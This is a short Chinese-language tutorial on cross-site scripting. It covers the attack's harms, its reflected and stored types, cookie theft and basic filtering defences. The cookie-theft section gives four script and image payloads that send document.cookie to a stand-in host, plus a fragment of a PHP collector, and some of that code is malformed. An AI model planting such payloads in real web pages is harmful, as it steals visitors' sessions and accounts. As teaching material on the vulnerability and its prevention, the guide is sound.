# xss

XSS, 即为（Cross Site Scripting）, 中文名为跨站脚本, 是发生在目标用户的浏览器层面上的，当渲染DOM树的过程成发生了不在预期内执行的JS代码时，就发生了XSS攻击。

**xss的危害：**

(1)网络钓鱼，包括获取各类用户账号

(2)通过document.cookie盗取cookie

(3)会话劫持，从而执行任意操作，例如进行非法转账，强制发表日志、发送电子邮件等

(4)网页挂马

(5)弹出广告，刷流量

(6)篡改页面信息,使用js或css破坏页面正常的结构与样式,，删除文章等

(7)进行大量用户攻击，如DDoS攻击

(8)传播跨站脚本蠕虫

(9)获取用户的客户端信息，例如ip地址，浏览历史，开放端口号等

(10)结合其他攻击，例如CSRF，进行进一步攻击

...

### 1.xss分类

(1)反射型

反射型XSS，也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。

(2)存储型

存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。

最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。

### 2.xss攻击方式解析

(1)cookie 盗取

原理：
  
在一个具有存储型xss(或者反射型)的网站里，攻击者就可以向漏洞页面写入可以窃取cookie的恶意代码，当用户浏览页面时，攻击者就能获取用户浏览器中的cookie信息。

攻击者可以用以下几种方式窃取cookie信息：

```html
//方式一
<script>document.location="http://www.test.com/cookie.php?cookie="+document.cookie</srcipt>

//方式二
<img src="http://www.test.com/cookie.php?cookie="+document.cookie></img>

//方式三
<script>
  new Image().src="http://www.test.com/cookie.php?cookie="+document.cookie
</script>

//方式四
<script>
 document.write('<img src="http://www.test.com/cookie.php?cookie="+document.cookie/>')
</script>
```

在远程服务器上有记录和接受cookie信息的文件：

```php
<?php
$cookie=$_GET('cookie');
...
```

攻击者获取cookie信息后，还要与web系统建立会话，才能侵入用户的账户，建立会话通常需要能修改cookie的工具，例如桂林老兵cookie欺骗工具，firefox的浏览器插件firecookie等。

### 3.xss 预防

- XSS Filter
  xss本质是web应用服务的漏洞，解决问题的根本是在web应用程序的代码中消除xss漏洞
  - input Filtering
    - 客户端输入验证
    - 输入过滤消毒，把敏感字符串如<,>,&,",#，javascript,expression等过滤掉
  - output Filtering
    - 输出编码，将敏感字符转化为html实体编码，如<转化为\&lt;
- 黑名单和白名单
  - 黑名单是明确指定哪些输入不能通过，但是很难预防，太多可能性的xss类型无法完全预防
  - 白名单是指定特定的输入格式能通过，其他的都不能，但减少了用户输入的可能性






